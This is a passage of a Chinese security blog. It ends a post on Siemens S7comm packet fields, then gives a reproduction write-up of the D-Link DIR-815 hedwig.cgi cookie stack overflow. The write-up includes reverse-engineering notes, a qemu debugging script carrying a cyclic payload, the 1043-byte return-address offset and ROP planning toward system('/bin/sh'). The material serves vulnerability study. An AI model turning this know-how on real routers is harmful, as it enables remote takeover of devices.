<p> <code>Protocol Id</code> 为协议 <code>ID</code> ，属于常量为 <code>0x32</code></p>
<p><code>ROSCTR</code> 表示 <code>PDU</code> （协议数据单元）的类型，有以下值</p>
<table>
<thead>
<tr>
<th>值</th>
<th>类型</th>
<th>解释</th>
</tr>
</thead>
<tbody><tr>
<td>0x01</td>
<td>Job</td>
<td>主站发送的作业请求（例如读&#x2F;写存储器，读&#x2F;写块，启&#x2F;停设备，通信设置）</td>
</tr>
<tr>
<td>0x02</td>
<td>Ack</td>
<td>没有数据字段的简单确认</td>
</tr>
<tr>
<td>0x03</td>
<td>Ack_Data</td>
<td>带有数据字段的应答，一般来响应 <code>Job</code> 请求</td>
</tr>
<tr>
<td>0x07</td>
<td>Userdata</td>
<td>扩展协议，其参数字段包含请求&#x2F;响应ID，一般用于编程&#x2F;调试、读取SZL</td>
</tr>
</tbody></table>
<p><code>Redundancy Identification (Reserved)</code>  :  冗余数据，通常为 <code>0x0000</code> </p>
<p><code>Protocol Data Unit Reference</code>  :  确保通信中每个 <code>PDU</code> 都有唯一的标识，发送方会为每个发送的 <code>PDU</code> 分配一个独立的协议数据单元参考值。接收方在接收到PDU时会检查该字段，以确认该<code> PDU</code> 是否是之前接收过的重复 <code>PDU</code> ，或者是一个新的 <code>PDU</code>   <strong><code>Job</code> 报文和 <code>Ack_Data</code> 报文的<code>protocol data unit reference</code> 值是一样的，个人猜测是为了确保 <code>Ack_Data</code> 是对应于特定的 <code>Job</code> 报文相应</strong> </p>
<p><code>Parameter length</code>  ：参数 <code>Parameter</code> 字段的长度</p>
<p><code>Data length</code>  ：数据 <code>Data</code> 字段的长度</p>
<p><code>Error class</code>  ：仅存在于 <strong>Ack-Data</strong> 报文中，可能的错误常量查看<a href="http://gmiru.com/resources/s7proto/constants.txt">协议常量</a></p>
<p><code>Error code</code>  ：仅存在于 <strong>Ack-Data</strong> 报文中，可能的错误常量查看<a href="http://gmiru.com/resources/s7proto/constants.txt">协议常量</a></p>
<h4 id="Parameter"><a href="#Parameter" class="headerlink" title="Parameter"></a>Parameter</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Parameter: (Write Var)</span><br><span class="line">    Function: Write Var (0x05)</span><br><span class="line">    Item count: 1</span><br><span class="line">    Item [1]: (DB 1.DBX 4.0 WORD 20)</span><br><span class="line">        Variable specification: 0x12</span><br><span class="line">        Length of following address specification: 10</span><br><span class="line">        Syntax Id: S7ANY (0x10)</span><br><span class="line">        Transport size: WORD (4)</span><br><span class="line">        Length: 20</span><br><span class="line">        DB number: 1</span><br><span class="line">        Area: Data blocks (DB) (0x84)</span><br><span class="line">        Address: 0x000020</span><br><span class="line">            .... .000 0000 0000 0010 0... = Byte Address: 4</span><br><span class="line">            .... .... .... .... .... .000 = Bit Address: 0</span><br></pre></td></tr></table></figure>

<p>上面 <code>Header</code> 部分提到了 <code>Parameter</code> 字段的长度为 <code>14</code> ，通过下图观察，得以验证</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111643863.png" alt="image-20230711164349761"></p>
<p><code>Function</code>  ：功能码，当 <code>PDU</code> 类型为 <code>Job</code> 或者 <code>Ack_Data</code> 类型时常见的功能码如下：</p>
<table>
<thead>
<tr>
<th>Hex</th>
<th>Value</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>CPU services</td>
<td>CPU服务</td>
</tr>
<tr>
<td>0xf0</td>
<td>Setup communication</td>
<td>建立通信</td>
</tr>
<tr>
<td>0x04</td>
<td>Read Var</td>
<td>读取值</td>
</tr>
<tr>
<td>0x05</td>
<td>Write Var</td>
<td>写入值</td>
</tr>
<tr>
<td>0x1a</td>
<td>Request download</td>
<td>请求下载</td>
</tr>
<tr>
<td>0x1b</td>
<td>Download block</td>
<td>下载块</td>
</tr>
<tr>
<td>0x1c</td>
<td>Download ended</td>
<td>下载结束</td>
</tr>
<tr>
<td>0x1d</td>
<td>Start upload</td>
<td>开始上传</td>
</tr>
<tr>
<td>0x1e</td>
<td>Upload</td>
<td>上传</td>
</tr>
<tr>
<td>0x1f</td>
<td>End upload</td>
<td>上传结束</td>
</tr>
<tr>
<td>0x28</td>
<td>PI-Service</td>
<td>程序调用服务</td>
</tr>
<tr>
<td>0x29</td>
<td>PLC Stop</td>
<td>关闭PLC</td>
</tr>
</tbody></table>
<p><code>Item count</code>  ：表示一个请求中包含的数据项 <code>Item</code> 的数量</p>
<p><code>Item</code>  ：数据项，<code>Item [1]</code> 表示第一个数据项。它描述了要操作的数据的详细信息，包括数据类型、长度和位置等。</p>
<p><code>Item</code> 结构又包含如下字段：</p>
<p><code>Variable specification</code>  ：变量规范字段，一般为 <code>0x12</code></p>
<p><code>Length of following address specification</code>  ：地址规范长度，主要是以此往后的地址长度（通过下面这个图看的可能比较直观）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307111719582.png" alt="image-20230711171959489"></p>
<p><code>Syntax Id</code>  ：为 <code>IDS</code> 的地址规范格式类型，主要用来确定寻址模式。常见值如下</p>
<table>
<thead>
<tr>
<th>Hex</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0x10</td>
<td>S7ANY</td>
<td>Address data S7-Any pointer-like DB1.DBX10.2</td>
</tr>
<tr>
<td>0x13</td>
<td>PBC-R_ID</td>
<td>R_ID for PBC</td>
</tr>
<tr>
<td>0x15</td>
<td>ALARM_LOCKFREE</td>
<td>Alarm lock&#x2F;free dataset</td>
</tr>
<tr>
<td>0x16</td>
<td>ALARM_IND</td>
<td>Alarm indication dataset</td>
</tr>
<tr>
<td>0x19</td>
<td>ALARM_ACK</td>
<td>Alarm acknowledge message dataset</td>
</tr>
<tr>
<td>0x1a</td>
<td>ALARM_QUERYREQ</td>
<td>Alarm query request dataset</td>
</tr>
<tr>
<td>0x1c</td>
<td>NOTIFY_IND</td>
<td>Notify indication dataset</td>
</tr>
<tr>
<td>0xa2</td>
<td>DRIVEESANY</td>
<td>seen on Drive ES Starter with routing over S7</td>
</tr>
<tr>
<td>0xb2</td>
<td>1200SYM</td>
<td>Symbolic address mode of S7-1200</td>
</tr>
<tr>
<td>0xb0</td>
<td>DBREAD</td>
<td>Kind of DB block read, seen only at an S7-400</td>
</tr>
<tr>
<td>0x82</td>
<td>NCK</td>
<td>Sinumerik NCK HMI access</td>
</tr>
</tbody></table>
<p><code>Transport size</code>  ：指的是数据传输的大小或类型，它用于定义在进行数据交换时所使用的数据单元大小。</p>
<table>
<thead>
<tr>
<th align="left">Hex</th>
<th align="left">值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">2</td>
<td align="left">BYTE</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">CHAR</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">WORD</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">INT</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">DWORD</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">DINT</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">REAL</td>
</tr>
</tbody></table>
<p><code>Length</code> 指的是写&#x2F;读 数据的长度，就是模拟器中的 <code>Amount</code> 字段</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307131035340.png" alt="image-20230713103518022"></p>
<p><code>DB number</code>  ： DB块编号，如果访问的不是DB区域，此处为0x0000</p>
<p><code>Area</code>  ：代表要操作的区域类型，如下表</p>
<table>
<thead>
<tr>
<th>Hex</th>
<th>Value</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0x03</td>
<td>System info of 200 family</td>
<td>200系列系统信息</td>
</tr>
<tr>
<td>0x05</td>
<td>System flags of 200 family</td>
<td>200系列系统标志</td>
</tr>
<tr>
<td>0x06</td>
<td>Analog inputs of 200 family</td>
<td>200系列模拟量输入</td>
</tr>
<tr>
<td>0x07</td>
<td>Analog outputs of 200 family</td>
<td>200系列模拟量输出</td>
</tr>
<tr>
<td>0x80</td>
<td>Direct peripheral access (P)</td>
<td>直接访问外设</td>
</tr>
<tr>
<td>0x81</td>
<td>Inputs (I)</td>
<td>输入（I）</td>
</tr>
<tr>
<td>0x82</td>
<td>Outputs (Q)</td>
<td>输出（Q）</td>
</tr>
<tr>
<td>0x83</td>
<td>Flags (M)</td>
<td>内部标志（M）</td>
</tr>
<tr>
<td>0x84</td>
<td>Data blocks (DB)</td>
<td>数据块（DB）</td>
</tr>
<tr>
<td>0x85</td>
<td>Instance data blocks (DI)</td>
<td>背景数据块（DI）</td>
</tr>
<tr>
<td>0x86</td>
<td>Local data (L)</td>
<td>局部变量（L）</td>
</tr>
<tr>
<td>0x87</td>
<td>Unknown yet (V)</td>
<td>全局变量（V）</td>
</tr>
<tr>
<td>0x1c</td>
<td>S7 counters (C)</td>
<td>S7计数器（C）</td>
</tr>
<tr>
<td>0x1d</td>
<td>S7 timers (T)</td>
<td>S7定时器（T）</td>
</tr>
<tr>
<td>0x1e</td>
<td>IEC counters (200 family)</td>
<td>IEC计数器（200系列）</td>
</tr>
<tr>
<td>0x1f</td>
<td>IEC timers (200 family)</td>
<td>IEC定时器（200系列）</td>
</tr>
</tbody></table>
<h4 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h4><pre><code>Data
    Item [1]: (Reserved)
        Return code: Reserved (0x00)
        Transport size: BYTE/WORD/DWORD (0x04)
        Length: 40
        Data: 010366778899000011000000000000000000000000000000000000ff0000000000000000…
</code></pre>
<p>因为 <code>Wirte</code> 操作要写入值，所以它比 <code>Read</code> 操作多一个 <code>Data</code> 部分。</p>
<p><code>return code</code> ：返回码，用来标识 <code>job</code> 操作后的结果（这里的 <code>Return code</code> 是 <code>0x00</code> ，因为这里截取的是请求报文，它对应的响应报文中的 <code>return code</code> 字段是 <code>0xff</code>）</p>
<table>
<thead>
<tr>
<th>Hex</th>
<th>值</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>0x00</td>
<td>Reserved</td>
<td>未定义，预留</td>
</tr>
<tr>
<td>0x01</td>
<td>Hardware error</td>
<td>硬件错误</td>
</tr>
<tr>
<td>0x03</td>
<td>Accessing the object not allowed</td>
<td>对象不允许访问</td>
</tr>
<tr>
<td>0x05</td>
<td>Invalid address</td>
<td>无效地址，所需的地址超出此PLC的极限</td>
</tr>
<tr>
<td>0x06</td>
<td>Data type not supported</td>
<td>数据类型不支持</td>
</tr>
<tr>
<td>0x07</td>
<td>Data type inconsistent</td>
<td>日期类型不一致</td>
</tr>
<tr>
<td>0x0a</td>
<td>Object does not exist</td>
<td>对象不存在</td>
</tr>
<tr>
<td>0xff</td>
<td>Success</td>
<td>成功</td>
</tr>
</tbody></table>
<p><code>Transport size</code>  ：数据传输的大小或类型，上面已经介绍过</p>
<p><code>Length</code>  ：这里的 <code>Length</code> 指的是只有 <code>Data</code> （下面这个字段）的长度，并不是这个 <code>Data</code> 部分的长度</p>
<p><code>Data</code>  ：需要写入的数据</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/6603?accounttraceid=336501792de944e4807240804083f4f3zheo#toc-2">https://xz.aliyun.com/t/6603?accounttraceid=336501792de944e4807240804083f4f3zheo#toc-2</a></p>
<p><a href="https://blog.csdn.net/oliver223/article/details/118107094">https://blog.csdn.net/oliver223/article/details/118107094</a></p>
<p><a href="https://blog.csdn.net/weixin_43158056/article/details/104298156">https://blog.csdn.net/weixin_43158056/article/details/104298156</a></p>
]]></content>
      <categories>
        <category>工控安全</category>
      </categories>
      <tags>
        <tag>工控基础</tag>
        <tag>协议分析</tag>
      </tags>
  </entry>
  <entry>
    <title>D-Link DIR-815路由器溢出漏洞分析</title>
    <url>/posts/d1f081a9.html</url>
    <content><![CDATA[<p>网上关于 <code>D-Link DIR-815</code> 路由器漏洞复现的文章还是蛮多的，因此第一次的复现选择了这个软柿子🤔。因为相关文章很多的缘故，所以我尽可能来写一些大多文章没有提到的点。</p>
<blockquote>
<p><strong>漏洞描述 ：DIR-815 固件中的 Hedwig.cgi 脚本中，在处理 HTTP 头时，如果 Cookie 字段中含 uid&#x3D; 的值则存在栈溢出漏洞，从而获得路由器远程控制权限</strong></p>
<p><strong>影响版本 ：DIR-815&#x2F;300&#x2F;600&#x2F;645等</strong></p>
</blockquote>
<span id="more"></span>

<p>首先下载固件，然后用 <code>binwalk</code> 解压出来得到文件系统，很多文章对这里进行了详细介绍，这里就不再赘述了，只记录一个关于解压后出现的软链接问题。我的 <code>ubuntu 18.04</code> 中 <code>binwalk</code>  解压文件系统时报了如下的 <code>warning</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241301795.png" alt="image-20230524130155598"></p>
<p>查看 <code>web</code> 目录下的文件发现软链接都指向了 <code>/dev/null </code>（如下）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241304963.png" alt="image-20230524130428836" style="zoom:50%;" />

<p>如果单纯的为了启动程序，可以去手动设置回原本的软链接（上面的 <code>warning</code> 中有记录原本的链接位置在哪），下文中也提到了这一点。不过在该漏洞复现完之后，我在一篇文章中发现了解决的方法。</p>
<p>先去下面这个目录，然后找到 <code>extractor.py</code> 文件（如果找不到这个目录的话也可以用 <code>find</code> 搜一下 <code>extractor.py</code> 的位置）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241311237.png" alt="image-20230524131107143"></p>
<p>然后来编辑这个文件，直接翻到文件的最后一行，应该是下面这样的</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241315177.png" alt="image-20230524131525489" style="zoom:67%;" />

<p>就改成 <code>if 0 and not</code> 让这个 <code>if</code> 进不去即可。</p>
<p>最后执行命令 <code>sudo python3 setup.py install</code> 重新安装 <code>binwalk</code> 就能生效了，可以看到现在的效果是正常的（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241319641.png" alt="image-20230524131948361"></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305241320382.png" alt="image-20230524132004859" style="zoom:50%;" />

<p>不过需要提一句，这里即使看起来软链接是正常的，但依然无法正常启动程序，如果想要运行某个程序的话（依然需要自己手动创建一个软链接，至少我的是这样）</p>
<h3 id="运行时报错"><a href="#运行时报错" class="headerlink" title="运行时报错"></a>运行时报错</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181721376.png" alt="image-20230518172151330"></p>
<p>这个报错说明找不到 <code>libgcc_s.so.1</code> 文件，解决方法是将解压固件得到的文件系统中的 <code>/lib</code> 目录下的 <code>libgcc_s.so.1</code> 文件软链接到 <code>/lib</code> 目录下即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305190951158.png" alt="image-20230519095103004"></p>
<p>然后再次运行发现并不是原本缺少 <code>libgcc_s.so.1</code> 的报错了（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181658971.png" alt="image-20230518165839841"></p>
<p>看到这个字符串会感觉有点熟悉，将 <code>cgibin</code> 拖到 <code>ida</code> 里发现是程序里没有匹配到相应的函数（如下），因为运行的 <code>cgibin</code> 程序并不在这个匹配的列表中，正常情况下都是通过软链接指向的这个程序来执行的。所以要去执行 <code>hedwig.cgi</code> 程序</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181659144.png" alt="image-20230518165917093"></p>
<p>因为当初 <code>binwalk</code> 提取完固件，其中 <code>hedwig.cgi</code> 的软链接都指向了 <code>/dev/null</code> ，所以这里要把 <code>hedwig.cgi</code> 删掉，重新生成一个 <code>cgibin</code> 的软链接。</p>
<p>下图程序是成功跑起来了</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181713829.png" alt="image-20230518171306696"></p>
<h3 id="分析二进制文件"><a href="#分析二进制文件" class="headerlink" title="分析二进制文件"></a>分析二进制文件</h3><h4 id="main"><a href="#main" class="headerlink" title="main"></a>main</h4><p><code>main</code> 函数的最开始在匹配程序名以来调用不同的函数来实现具体功能。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305180744182.png" alt="image-20230518074412983" style="zoom:50%;" />

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v3 = *argv;</span><br><span class="line">v6 = <span class="built_in">strrchr</span>(*argv, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> ( v6 )</span><br><span class="line">  v3 = v6 + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">&quot;phpcgi&quot;</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = (<span class="type">void</span> (__noreturn *)())phpcgi_main;</span><br><span class="line">  v9 = argc;</span><br><span class="line">  <span class="keyword">return</span> ((<span class="type">int</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以这段代码为例，首先根据 <code>*argv</code> 获取程序的名字，通过 <code>strrchr</code> 函数来匹配程序名中最后一个 <code>/</code> 出现的位置， <code>v6+1</code> 取的是 <code>/</code> 的下一个字符的地址，然后来匹配是否为 <code>phpcgi</code> 这个字符串， 如果是的话则跳转到 <code>phpcgi_main</code> 函数，整个 <code>main</code> 函数都是在做这个事情</p>
<h4 id="hedwigcgi-main"><a href="#hedwigcgi-main" class="headerlink" title="hedwigcgi_main"></a>hedwigcgi_main</h4><p>接下来逐步分析 <code>hedwigcgi_main</code> 函数</p>
<p><code>sprintf</code> 是危险函数，将字符串格式化后拷贝到指定内存时没有规定长度大小从而可能存在溢出</p>
<p>这里需要让环境变量 <code>REQUEST_METHOD</code> 为 <code>POST</code> ，并且创建 <code>/var/tmp/temp.xml</code> 文件</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210851749.png" alt="image-20230521085117376"></p>
<p>上图中出现的一个关键函数是 <code>sess_get_uid</code> ，它的作用是将提取的 <code>COOKIE</code> 中 <code>uid=</code> 后面的字符串存为 <code>v4</code> 的 <code>data</code> 字段。下面来分析一下这个函数</p>
<h5 id="sess-get-uid"><a href="#sess-get-uid" class="headerlink" title="sess_get_uid"></a>sess_get_uid</h5><p>在分析这个函数之前，还需要分析前面出现过的几个函数 <code>sobj_new</code> <code>sobj_strcmp</code> <code>sobj_add_char</code>  <code>sobj_get_string</code> </p>
<h5 id="sobj-new"><a href="#sobj-new" class="headerlink" title="sobj_new"></a>sobj_new</h5><p>申请了一块堆，用来存储结构体的数据，主要关注的是 <code>max_len</code>  <code>used_len</code> <code>data</code> 这三个成员，其他几个之后逆向分析的时候没用到（这里每个字段的含义，不是一上来就知道的，这是分析其他函数时进行猜测的）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181102504.png" alt="image-20230518110253441" style="zoom:50%;" />

<h5 id="sobj-strcmp"><a href="#sobj-strcmp" class="headerlink" title="sobj_strcmp"></a>sobj_strcmp</h5><p>传入的参数一个是 <code>sobj_new</code> 返回的结构体指针，另一个是字符串指针，判断结构体的 <code>data</code> 字段存储的字符串是否和传入的字符串一样</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181117507.png" alt="image-20230518111747463" style="zoom:50%;" />

<h5 id="sobj-add-char"><a href="#sobj-add-char" class="headerlink" title="sobj_add_char"></a>sobj_add_char</h5><p>传入了 <code>sobj_new</code> 返回的结构体指针，另一个参数是字符。首先判断结构体指针是否存在，<code>max_len</code> 是否等于 <code>used_len</code> 。如果符合条件的话将字符 <code>ch</code> 写入到 <code>data</code> 字段中，并且让 <code>used_len</code> 字段加一。</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181126711.png" alt="image-20230518112641661" style="zoom:50%;" />



<h5 id="sobj-get-string"><a href="#sobj-get-string" class="headerlink" title="sobj_get_string"></a>sobj_get_string</h5><p>该函数用于返回传入的结构体指针中 <code>data</code> 域的指针</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181132195.png" alt="image-20230518113206147" style="zoom:50%;" />



<p>现在来分析 <code>sess_get_uid</code> </p>
<p>函数最开始进行了一些初始化和判断，同时拿到了环境变量 <code>HTTP_COOKIE</code> 值的指针，并设置   <code>state</code> （ 状态位）为 <code>0</code></p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305181110826.png" alt="image-20230518111058786" style="zoom:50%;" />

<p>该函数具体功能是通过逐个扫描 <code>COOKIE</code> 的字符，来寻找 <code>=</code> ，如果找到了 <code>=</code> 则设置 <code>state</code> 为 <code>2</code> ，之后再扫描字符的时候因为 <code>state</code> 为 <code>2</code> 的缘故，都会进入另一个分支，去将扫描 <code>COOKIE</code> 的字符存储到 <code>v4</code> 结构体的 <code>data</code> 成员中。如果没有找到 <code>=</code> 那么 <code>state</code> 一直为 <code>1</code> ，则始终将 <code>COOKIE</code> 的字符存储到 <code>v2</code> 结构体的 <code>data</code> 成员中（如下图）</p>
<p>当扫描完 <code>COOKIE</code> 的所有字符后，去判断 <code>v2</code> 结构体的 <code>data</code> 成员是否为字符串 <code>uid</code> ，如果是的话，就将 <code>v4</code> 结构体之前存储的字符串写到结构体 <code>a1</code> 的 <code>data</code> 域中。（ <code>a1</code> 也就是 <code>sess_get_uid</code> 函数传入的结构体指针）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210943265.png" alt="image-20230521094300133" style="zoom: 67%;" />



<p>再回到 <code>hedwigcgi_main</code> 函数上，现在想执行到真正利用的溢出点，需要控制 <code>haystack</code> 的值才行（如下图）</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210954878.png" alt="image-20230521095402701" style="zoom:50%;" /> 



<h4 id="控制-haystack"><a href="#控制-haystack" class="headerlink" title="控制 haystack"></a>控制 <code>haystack</code></h4><p>通过查看 <code>haystack</code> 的交叉引用（如下图），发现只有一个地方可以对 <code>haystack</code> 进行赋值</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305210959344.png" alt="image-20230521095927264" style="zoom:67%;" />



<p>跳转过去到了 <code>409A6C</code> 函数</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211000998.png" alt="image-20230521100001952" style="zoom:50%;" />

<p>如果记性不错的话应该能想起来它是一个回调函数，在 <code>hedwigcgi_main</code> 函数中出现过 <code>cgibin_parse_request((int)sub_409A6C, 0, 0x20000u);</code> 因此就要去分析 <code>cgibin_parse_request</code> 函数，看看是何时调用了 <code>409A6C</code> 函数</p>
<h5 id="cgibin-parse-request"><a href="#cgibin-parse-request" class="headerlink" title="cgibin_parse_request"></a>cgibin_parse_request</h5><p>这里是 <code>cgibin_parse_request</code> 函数的后部分，前部分要满足 <code>CONTENT_LENGTH &lt; 0x20000</code> 和 <code>REQUEST_URI</code> 这个值要存在，这样才能走到下面这部分</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211014282.png" alt="image-20230521101434200" style="zoom: 67%;" />

<p>这里设置 <code>CONTENT_TYPE</code> 为 <code>aApplication</code> ，最后会调用 <code>0x42C014[2]</code> 位置的指针，该函数指针就是 <code>0x403B10</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211050021.png" alt="image-20230521105041949"></p>
<p>之后给个分析的思路吧， 实在不想写这么详细了。</p>
<p>进入 <code>403B10</code> 函数，首先 <code>CONTENT_TYPE</code> 在原本的 <code>aApplication</code> 后面要再加上字符串 <code>x-www-form-urlencoded</code> 才能进入主逻辑部分。 <code>read</code> 会读入 <code>0xc</code> 个数据，然后将这个输入的数据作为参数调用 <code>402B40</code> 函数，这个函数将刚刚读入的数据，以 <code>=</code> 进行分割。接着调用了函数指针 <code>v9</code> （这个 <code>v9</code> 就是最开始所说的回调函数 <code>409A6C</code> ），而刚刚 <code>=</code> 前面的数据会被当做参数传进来，下面再看一下 <code>409A6c</code> 函数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211102535.png" alt="image-20230521110226484"></p>
<p>因此只要走到这里，<code>haystack</code> 就会被赋值成 <code>=</code> 前面字符串的地址。从而绕过 <code>if ( !haystack )</code> 这个判断。</p>
<p>总结一下赋值 <code>haystack</code> 的函数调用链 ：<code>cgibin_parse_requeset -&gt; 403b10 -&gt; 402b40 -&gt; 函数指针v9</code> ，初学者可以自行去详细分析上述过程。</p>
<h3 id="qemu-用户模式下复现"><a href="#qemu-用户模式下复现" class="headerlink" title="qemu 用户模式下复现"></a><code>qemu</code> 用户模式下复现</h3><h4 id="ROP-链的布置"><a href="#ROP-链的布置" class="headerlink" title="ROP 链的布置"></a><code>ROP</code> 链的布置</h4><p>现在是肯定能走到第二次的 <code>sprintf</code> 进行溢出了。现在我们来测一下溢出控制返回地址的偏移量是多少。</p>
<h5 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h5><p>先准备一个 <code>payload</code> 文件，里面放入 <code>COOKIE</code> 的值，这里直接用 <code>cyclic 2000 &gt; payload</code> ，不过别忘记在最开始加一个 <code>uid=</code> 字符串</p>
<p>然后写一个启动脚本（如下），这里简单说明一下这个脚本。首先使用 <code>chroot</code> 命令将当前目录 <code>squashfs-root</code> 设置为根目录，因为程序打开的文件都是相对于这个文件系统来说的。一旦将 <code>squashfs-root</code> 设置为根目录，那么 <code>qemu-mipsel</code>  就没办法使用了，因为依赖了其他目录的库文件，因此我们使用静态链接的 <code>qemu-mipsel-static</code> （我的 <code>ubuntu 18.04</code> 上用 <code>apt-get install</code> 安装的 <code>qemu-mipsel-static</code> 会报一个错误</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211510370.png" alt="image-20230521151058316"></p>
<p>原因是这个 <code>qemu-mipsel-static</code> 版本太低，我的解决方法是在 <code>ubuntu 22.04</code> 上安装后，拖到了 <code>18.04</code> 上）  </p>
<p><code>-E</code> 用于指定要在模拟的虚拟机中设置的环境变量，而这些变量是前面分析过的，进行设置即可,剩下的就和调试 <code>MIPS</code> 架构的程序一样了，有需要的话可以查看这篇 <a href="https://zikh26.github.io/posts/919c29c4.html#%E7%9B%B4%E6%8E%A5%E8%B0%83%E8%AF%95%E7%A8%8B%E5%BA%8F">文章</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">payload=$(echo &quot;$(cat payload)&quot;)</span><br><span class="line">sudo chroot . ./qemu-mipsel-static -E CONTENT_LENGTH=666 -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; -E REQUEST_METHOD=&quot;POST&quot; -E HTTP_COOKIE=$payload -E REQUEST_URL=&quot;zikh26&quot;  -g 1234 /htdocs/web/hedwig.cgi </span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211147020.png" alt="image-20230521114724909"></p>
<p>发现覆盖到返回地址需要填充 <code>1043</code> 的垃圾数据。</p>
<p>通过观察函数最后返回处的汇编，这里是可以控制很多寄存器，我们接下来就是要通过这些可控的寄存器来完成 <code>ROP</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211148333.png" alt="image-20230521114847280"></p>
<h5 id="ROP-system"><a href="#ROP-system" class="headerlink" title="ROP-system"></a>ROP-system</h5><p>因为这个程序的溢出是 <code>sprintf</code> 导致的， <code>\x00</code> 可以造成字符串的截断，而 <code>system</code> 函数地址末尾就是 <code>\x00</code> ，为了避免被截断，我们要先让 <code>system</code> 函数的地址减一放入一个寄存器，之后跳转到能让这个寄存器加一的 <code>gadget</code> 上。<code>MIPS</code> 架构的 <code>ROP</code> 是通过寄存器间的跳转实现的，而 <code>x86</code> 中通常是用 <code>ret</code> 指令根据栈中存放的数据来跳转的。</p>
<p>在 《揭秘家用路由器0day漏洞挖掘技术》一书中对该 <code>ROP</code>  链布局画的十分形象（如下），因为上面提到了我们能控制很多寄存器，就先在 <code>$ra</code> 寄存器布置一个让 <code>$s0</code> 加一的 <code>gadget</code> （提前控制 <code>$s0</code> 为 <code>system</code> 减一的地址），接着跳转到一段能赋值栈地址的 <code>gadget</code> 上（用于指向 <code>/bin/sh</code> ），最后跳回到 <code>system</code> 上</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211441230.png" alt="image-20230521144117106"></p>
<p>补充：</p>
<ol>
<li>程序依赖的 <code>libc</code> 是软链接 <code>libc.so.0</code> 指向的 <code>libuClibc-0.9.30.1.so</code> ，因此 <code>gadget</code> 要去这个里面找</li>
<li>找 <code>gadget</code> 的话，用 <code>IDA</code> 插件 <code>mipsrop</code> 。以上面两段 <code>gadget</code> 为例，搜寄存器加一的指令可以这么搜 <code>mipsrop.find(&quot;addiu .*,1&quot;)</code> ，当然了可能会出现下面的报错</li>
</ol>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211457716.png" alt="image-20230521145755628"></p>
<p>只需要点一下 <code>search -&gt; mips rop gadgets</code>  即可</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202305211458582.png" alt="image-20230521145839462"></p>
<p>能匹配到很多个 <code>gadget</code> （如下），根据自己布局的需求来选择合适的就可以</p>
